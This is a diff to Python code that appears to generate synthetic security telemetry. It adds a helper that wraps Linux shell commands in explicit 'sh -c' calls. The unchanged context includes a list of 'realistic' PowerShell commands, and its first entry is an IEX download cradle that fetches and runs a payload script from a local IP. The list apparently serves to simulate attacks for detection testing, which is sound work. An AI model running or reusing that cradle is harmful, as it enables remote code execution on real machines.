@@ -676,6 +676,23 @@ def _normalize_storyline_process_image(
     return resolve_image_path(process_name, os_category, username=username)
 
 
+def _linux_shell_process_command_line(process_name: str, command_line: str) -> str | None:
+    """Return an explicit shell invocation for Linux shell process specs."""
+    exe = process_name.rsplit("/", 1)[-1].lower()
+    if exe not in {"bash", "dash", "sh", "zsh"}:
+        return None
+    try:
+        parts = shlex.split(command_line, comments=False, posix=True)
+    except ValueError:
+        parts = command_line.split()
+    if not parts:
+        return f"{exe} -c ''"
+    first = parts[0].rsplit("/", 1)[-1].lower()
+    if first == exe:
+        return command_line
+    return f"{exe} -c {shlex.quote(command_line)}"
+
+
 # Realistic decoded PowerShell commands for base64 encoding
 POWERSHELL_COMMANDS = [
     "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
@@ -1879,11 +1896,20 @@ class StorylineMixin:
                     _linux_command_process_from_shell,
                 )
 
-                inferred_process = _linux_command_process_from_shell(command_line)
+                inferred_process = _linux_command_process_from_shell(
+                    command_line,
+                    username=actor.username,
+                )
                 if inferred_process is not None:
                     inferred_image, inferred_command_line = inferred_process
                     if inferred_image.rsplit("/", 1)[-1] == process_name.rsplit("/", 1)[-1]:
                         process_command_line = inferred_command_line
+                shell_command_line = _linux_shell_process_command_line(
+                    process_name,
+                    process_command_line,
+                )
+                if shell_command_line is not None:
+                    process_command_line = shell_command_line
 
             output_file = self._extract_output_file(command_line, os_category)
             process_actor = actor
